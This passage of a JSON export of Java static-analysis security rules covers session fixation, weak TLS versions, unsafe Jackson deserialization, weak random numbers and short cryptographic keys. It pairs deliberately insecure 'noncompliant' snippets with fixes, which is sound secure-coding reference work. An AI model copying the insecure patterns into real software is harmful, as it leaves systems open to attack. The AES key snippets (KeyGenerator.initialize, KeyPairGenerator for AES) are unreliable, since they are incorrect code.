mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"AES/GCM/NoPadding\");\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING\");\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5876": {
        "name": "A new session should be created during user authentication",
        "htmlDesc": "<p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and\nimpersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>\n<h2>Why is this an issue?</h2>\n<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically\nworks:</p>\n<ul>\n  <li> When a user visits a website or logs in, a session is created for them. </li>\n  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,\n  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>\n  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the\n  attacker. </li>\n  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain\nunauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>\n<h4>Impersonation</h4>\n<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid\ncredentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing\nmalicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as\nrevealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>\n<h4>Data Breach</h4>\n<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include\npersonal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can\nbe used for identity theft, financial fraud, or other malicious purposes.</p>\n<h4>Privilege Escalation</h4>\n<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher\nprivileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized\nmodifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>In a Spring Security’s context, session fixation protection is enabled by default but can be disabled with <code>sessionFixation().none()</code>\nmethod. Session fixation protection can also be enabled explicitly with <code>migrateSession()</code> but is superfluous in most cases.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n   http.sessionManagement()\n     .sessionFixation().none(); // Noncompliant: the existing session will continue\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n  http.sessionManagement()\n     .sessionFixation().migrateSession();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated\nduring the authentication process.</p>\n<p>Here’s how session fixation protection typically works:</p>\n<ol>\n  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored\n  in a cookie or passed through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows\n  the attacker to potentially gain unauthorized access to the user’s session. </li>\n  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a\n  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>\n  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.\n  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>\n  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier\n  is typically stored in a new session cookie or passed through URL parameters. </li>\n</ol>\n<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,\nsecure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s\nsession and helps maintain the integrity and security of the application’s session management process.</p>\n<p>In Spring, calling <code>migrateSession()</code> explicitly is not necessary in most cases, as it automatically migrates session attributes to a\nnew session upon successful authentication. The <code>migrateSession()</code> method is typically explicitly used when you want to manually trigger\nthe migration of session attributes to a new session outside of the authentication process.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<p><a href=\"https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html\">Session Fixation Attack\nProtection</a></p>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Session_fixation\">OWASP Sesssion Fixation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.net.ssl.SSLContext;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        SSLContext.getInstance(\"TLSv1.1\"); // Noncompliant\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.net.ssl.SSLContext;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        SSLContext.getInstance(\"TLSv1.2\");\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4544": {
        "name": "Using unsafe Jackson deserialization configuration is security-sensitive",
        "htmlDesc": "<p>Using unsafe Jackson deserialization configuration is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-4995\">CVE-2017-4995</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19362\">CVE-2018-19362</a> </li>\n</ul>\n<p>When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as Polymorphic Deserialization, \"deserialization gadgets\"\nmay allow an attacker to perform remote code execution.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> <code>enableDefaultTyping()</code> is called on an instance of <code>com.fasterxml.jackson.databind.ObjectMapper</code> or\n  <code>org.codehaus.jackson.map.ObjectMapper</code>. </li>\n  <li> or when the annotation <code>@JsonTypeInfo</code> is set at class, interface or field levels and configured with <code>use =\n  JsonTypeInfo.Id.CLASS</code> or <code>use = Id.MINIMAL_CLASS</code>. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You configured the Jackson deserializer as mentioned above. </li>\n  <li> The serialized data might come from an untrusted source. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use the latest patch versions of <code>jackson-databind</code> blocking the already discovered \"deserialization gadgets\". </li>\n  <li> Avoid using the default typing configuration: <code>ObjectMapper.enableDefaultTyping()</code>. </li>\n  <li> If possible, use <code>@JsonTypeInfo(use = Id.NAME)</code> instead of <code>@JsonTypeInfo(use = Id.CLASS)</code> or <code>@JsonTypeInfo(use =\n  Id. MINIMAL_CLASS)</code> and so rely on <code>@JsonTypeName</code> and <code>@JsonSubTypes</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping(); // Sensitive\n</pre>\n<pre>\n@JsonTypeInfo(use = Id.CLASS) // Sensitive\nabstract class PhoneNumber {\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data\">Deserialization of untrusted data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n  <li> <a href=\"https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062\">On Jackson CVEs: Don’t\n  Panic</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-15095\">CVE-2017-1509</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-7525\">CVE-2017-7525</a> </li>\n  <li> Derived from FindSecBugs rule <a\n  href=\"https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION\">JACKSON_UNSAFE_DESERIALIZATION</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>\nmethod should not be used for security-critical applications or for protecting sensitive data. In such context, the\n<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a cryptographically strong random number generator (RNG) like \"java.security.SecureRandom\" in place of this PRNG. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nRandom random = new Random(); // Sensitive use of Random\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/oTdGBQ\">CERT, MSC02-J.</a> - Generate strong random numbers </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UNcxBQ\">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2ns-BQ\">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n        keyPairGenerator.initialize(1024); // Noncompliant\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<p>Here is an example of a private key generation with AES:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport java.security.KeyGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyGenerator keyGenerator = KeyGenerator.getInstance(\"AES\");\n        keyGenerator.initialize(64); // Noncompliant\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.spec.ECGenParameterSpec;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator    = KeyPairGenerator.getInstance(\"EC\");\n        ECGenParameterSpec ellipticCurveName = new ECGenParameterSpec(\"secp112r1\"); // Noncompliant\n        keyPairGenerator.initialize(ellipticCurveName);\n\n    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n        keyPairGenerator.initialize(2048);\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"AES\");\n        keyPairGenerator.initialize(128);\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.spec.ECGenParameterSpec;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator    = KeyPairGenerator.getInstance(\"EC\");\n        ECGenParameterSpec ellipticCurveName = new ECGenParameterSpec(\"secp256r1\");\n        keyPairGenerator.initialize(ellipticCurveName);\n\n    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) 